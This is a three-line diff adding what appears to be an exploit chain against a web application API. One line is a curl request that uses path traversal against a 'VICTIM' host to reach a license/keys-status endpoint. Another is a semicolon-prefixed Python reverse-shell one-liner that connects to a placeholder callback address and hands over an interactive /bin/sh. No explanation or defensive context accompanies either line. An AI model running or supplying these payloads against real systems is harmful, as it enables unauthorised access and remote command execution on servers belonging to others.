@@ -1,0 +1,3 @@
+curl -ik --path-as-is https://VICTIM/api/v1/totp/user-backup-code/../../license/keys-status/
+
+;python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("CONNECTBACKIP",CONNECTBACKPORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())';
